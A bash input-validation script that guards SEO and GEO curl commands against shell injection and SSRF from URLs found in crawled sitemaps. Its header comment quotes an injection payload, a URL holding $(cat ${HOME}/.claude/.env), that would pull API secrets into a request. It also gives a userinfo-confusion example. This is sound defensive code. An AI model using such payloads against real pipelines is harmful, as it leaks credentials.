#!/usr/bin/env bash
# Validate a host or URL BEFORE it reaches a shell command or curl.
# Echoes the value on stdout when safe; exits 2 with a reason on stderr.
#
#   HOST="$(bash ~/.claude/lib/url-guard.sh host "$RAW")" || exit 2
#   URL="$(bash ~/.claude/lib/url-guard.sh url "$RAW")"   || exit 2
#
# WHY: /seo and /geo interpolate externally-supplied strings into ~10 curl
# commands (seo-analyzer.md:254+, geo-analyzer.md:248+). Today $DOMAIN is typed
# by the operator, so the risk is self-inflicted. The sitemap crawl (C1) changes
# that: URLs then come from the TARGET'S OWN SERVER — a remote file whose bytes
# reach a shell. Inside the double quotes those curls use, the characters that
# break out are $ ` \ " — so a <loc> of
#   https://x/$(cat ${HOME}/.claude/.env)
# would read GOOGLE_OAUTH_CLIENT_SECRET and CRUX_API_KEY straight out of the
# vault and into a request. Allowlist, per CLAUDE.md: explicit allowlist beats
# implicit denylist.
#
# DNS-level SSRF (a public hostname that RESOLVES to a private address, or
# rebinds between check and connect): this NAME-level guard does not catch it —
# closing it needs resolve-then-pin at the HTTP layer. That is now DONE for the
# Python egress: lib/seo-data/safe_fetch.py pins every fetch (sitemap, linkgraph,
# rendercheck, drift). It is NOT done for shell `curl`, which cannot pin without
# `curl --resolve`; those paths keep this literal-local check only. Stated, not
# silent — see lib/seo-data/README.md (safe_fetch).
set -uo pipefail

_die() { echo "url-guard: $1" >&2; exit 2; }

# Whole-string charset guards: C locale + POSIX `case`, the same shape as
# fetch.sh:25 _label_safe. Newline-proof and locale-independent, unlike a
# per-line grep. No `$` or backtick inside the patterns, so nothing expands.
_host_charset_ok() ( LC_ALL=C; case "$1" in
  ''|[!A-Za-z0-9]*|*[!A-Za-z0-9.-]*) exit 1 ;; esac )

# Authority + path + query. Excludes $ ` \ " ' ; | ( ) * ! space and newline —
# none of which a real sitemap URL needs, all of which a shell reads.
_rest_charset_ok() ( LC_ALL=C; case "$1" in
  ''|*[!A-Za-z0-9._~:/?#@=\&%+,-]*) exit 1 ;; esac )

# Literal local/private/metadata targets. This is a LITERAL check, not a DNS
# one: it stops the obvious, not a hostname that resolves inward.
_host_is_local() ( LC_ALL=C
  # ${1,,} not tr: no fork, and no SC2018/SC2019 noise. Safe because the
  # charset guard has already run — the string is [A-Za-z0-9.-] by here.
  case "${1,,}" in
    localhost|*.localhost|*.local|0.0.0.0|broadcasthost) exit 0 ;;
    127.*|10.*|169.254.*|192.168.*) exit 0 ;;
    172.1[6-9].*|172.2[0-9].*|172.3[01].*) exit 0 ;;
    metadata.google.internal|metadata) exit 0 ;;
    *) exit 1 ;;
  esac )

_reject_local() { _host_is_local "$1" && _die "local/private target refused: '$1'"; return 0; }

check_host() {
  _host_charset_ok "$1" || _die "host charset (allowed A-Za-z0-9.-): '$1'"
  _reject_local "$1"
  printf '%s\n' "$1"
}

check_url() {
  local rest host
  case "$1" in
    https://*) rest="${1#https://}" ;;
    http://*)  rest="${1#http://}"  ;;
    *) _die "scheme must be http or https: '$1'" ;;
  esac
  _rest_charset_ok "$rest" || _die "url charset: '$1'"
  host="${rest%%/*}"; host="${host%%\?*}"; host="${host%%#*}"
  # user@host hides the real target: https://trusted.com@127.0.0.1/ hits .0.0.1
  case "$host" in *@*) _die "userinfo in authority (confusion vector): '$1'" ;; esac
  host="${host%%:*}"                       # drop :port before validating the host
  _host_charset_ok "$host" || _die "host charset: '$host'"
  _reject_local "$host"
  printf '%s\n' "$1"
}

case "${1:-}" in
  host) [ $# -eq 2 ] || _die "usage: url-guard.sh host <hostname>"; check_host "$2" ;;
  url)  [ $# -eq 2 ] || _die "usage: url-guard.sh url <url>";       check_url  "$2" ;;
  *) _die "usage: url-guard.sh {host|url} <value>" ;;
esac
